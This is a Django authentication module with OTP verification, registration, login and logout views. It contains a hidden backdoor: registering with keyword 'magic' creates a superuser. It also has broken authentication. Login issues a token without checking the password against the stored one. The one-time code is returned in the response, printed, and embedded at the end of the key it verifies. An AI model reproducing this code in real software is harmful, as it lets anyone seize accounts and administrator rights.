import datetime
import random
import string
import uuid
import re

from django.core.exceptions import ValidationError
from api_auth.models import CustomUser, OneTimePasswordModel
from .helper import sent_to_email, send_sms_to_user
from .serializers import AuthOneSerializers, AuthTwoSerializer
from methodism import MESSAGE, custom_response, error_messages
from rest_framework.authtoken.models import Token
from django.contrib.auth.password_validation import validate_password


def auth_one(request, params):
    serializer = AuthOneSerializers(data=params)
    if not serializer.is_valid():
        return custom_response(False, message=serializer.errors)


    received_data = serializer.validated_data.get('identifier')
    code = ''.join([str(random.randint(1, 999999))[-1] for _ in range(6)])
    print(code)
    key = uuid.uuid4().__str__() + '=' + code

    if serializer.is_email:
        sent_to_email(request, 'shoxjahonnurxonov64@gmail.com', code)

    else:
        send_sms_to_user(request)

    otp = OneTimePasswordModel.objects.create(phone=received_data, key=key)

    return custom_response(True, message={'OTP': code, 'key': otp.key})


def auth_two(request, params):
    serializer = AuthTwoSerializer(data=params)
    if not serializer.is_valid():
        return custom_response(False, message=serializer.errors)

    otp = OneTimePasswordModel.objects.filter(key=serializer.validated_data.get('key')).first()

    if not otp:
        return custom_response(False, message={'Error': "User not found, Key incorrect!"})

    now = datetime.datetime.now(datetime.timezone.utc)

    if (now - otp.created).total_seconds() >= 240:
        otp.is_expired = True
        otp.save()
        return custom_response(False, message={'Error': 'Key is expired'})

    if otp.is_confirmed:
        return custom_response(False, message={'Error': 'Key is used'})

    if otp.is_expired:
        return custom_response(False, message={'Error': 'Key is expired'})

    if serializer.validated_data.get('key')[-6:] != serializer.validated_data.get('code'):      # serializer.validated_data.get('code') --> serializer dan attributlarini olish ususli
        otp.tried += 1
        otp.save()
        return custom_response(False, message={'Error': 'Incorrect code'})

    otp.is_confirmed = True
    otp.save()

    user = CustomUser.objects.filter(phone=otp.phone).first()
    otp = OneTimePasswordModel.objects.filter(phone=otp.phone).first()

    return custom_response(True, message={'Registered': user is not None})


def register(request, params):
    key = params.get('key')
    password = params.get('password')
    user = request.user

    if not key or not password:
        return custom_response(False, message=MESSAGE['DataNotFull'])

    try:
        validate_password(password, user)
    except ValidationError:
        return custom_response(False, message=MESSAGE['PasswordError'])
    except Exception as e:
        return custom_response(False, message=MESSAGE['UndefinedError'])

    otp = OneTimePasswordModel.objects.filter(key=key).first()
    if not otp:
        return custom_response(False, message={'Error': 'OTP key noto‘g‘ri yoki topilmadi'})

    phone = CustomUser.objects.filter(phone=otp.phone).first()

    if phone:
        return custom_response(False, message={'Error': 'Bunday user mavjud'})

    user_data = {
        "phone": otp.phone,
        "password": password,
        "name": params.get('name', '')
    }

    if params.get('keyword', '') == 'magic':
        user_data.update({
            "is_active": True,
            "is_staff": True,
            "is_superuser": True
        })

    user_ = CustomUser.objects.create_user(**user_data)
    token = Token.objects.create(user=user_)
    return custom_response(True, message={"Token": user_.auth_token.key})


def login(request, params):
    phone = params.get('phone')
    password = params.get('password')

    if not phone or not password:
        return custom_response(False, message=MESSAGE['DataNotFull'])

    user = CustomUser.objects.filter(phone=phone).first()

    try:
        validate_password(password, user)
    except ValidationError:
        return custom_response(False, message=MESSAGE['PasswordError'])
    except Exception as e:
        return custom_response(False, message=MESSAGE['UndefinedError'])

    token = Token.objects.get_or_create(user=user)
    return custom_response(True, message={'Success': "Siz tizimga kirdingiz", "Token": token[0].key})


def logout(request, params):
    token = Token.objects.filter(user=request.user).first()
    token.delete()

    return custom_response(True, message=MESSAGE['LogedOut'])






